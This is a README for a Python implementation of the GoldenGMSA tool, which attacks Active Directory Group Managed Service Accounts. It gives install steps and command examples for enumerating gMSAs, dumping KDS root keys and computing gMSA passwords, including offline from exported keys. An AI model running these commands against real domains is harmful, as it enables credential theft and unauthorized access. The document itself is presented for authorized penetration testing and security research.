# GoldenGMSA Python

Python implementation of the GoldenGMSA tool for exploiting Group Managed Service Accounts (gMSA) in Active Directory.

## Installation

```bash
# Clone the repository
git clone https://github.com/felixbillieres/goldenGMSA.git
cd goldenGMSA/golden_gmsa_python

# Create a virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt
```

## Usage

### Domain Authentication

```bash
# With authentication (recommended)
python main.py -u 'DOMAIN\username' -p 'password' --domain domain.local gmsainfo

# Or with UPN format
python main.py -u 'user@domain.local' -p 'password' --domain domain.local gmsainfo

# With domain controller IP
python main.py -u 'user@domain.local' -p 'password' --domain domain.local --dc-ip 192.168.1.10 gmsainfo

# With LDAPS (SSL)
python main.py -u 'user@domain.local' -p 'password' --domain domain.local --use-ssl gmsainfo
```

### Available Commands

```bash
# Enumerate all gMSAs in the domain
python main.py -u 'user@domain.local' -p 'password' --domain domain.local gmsainfo

# Query a specific gMSA by SID
python main.py -u 'user@domain.local' -p 'password' --domain domain.local gmsainfo --sid <SID_GMSA>

# Dump all KDS root keys
python main.py -u 'user@domain.local' -p 'password' --domain domain.local kdsinfo

# Calculate a gMSA password
python main.py -u 'user@domain.local' -p 'password' --domain domain.local compute --sid <SID_GMSA>

# Offline mode (no authentication, with exported keys)
python main.py compute --sid <SID_GMSA> --kdskey <BASE64_KEY> --pwdid <BASE64_PWDID>

# View all options
python main.py --help
```

### Supported Authentication Formats

- **UPN**: `user@domain.local`
- **NetBIOS**: `DOMAIN\username`
- **Simple**: `username` (domain will be added automatically)

## Disclaimer

This tool is intended **only for authorized penetration testing** and **security research**. Using this tool on systems without explicit permission is **illegal**.

## License

MIT License

## Author

**Félix Billières (Elliot Belt)**

## Credits

Based on research by Yuval Gordon ([@YuG0rd](https://twitter.com/YuG0rd)) - [Introducing the Golden GMSA Attack](https://www.semperis.com/blog/golden-gmsa-attack/)
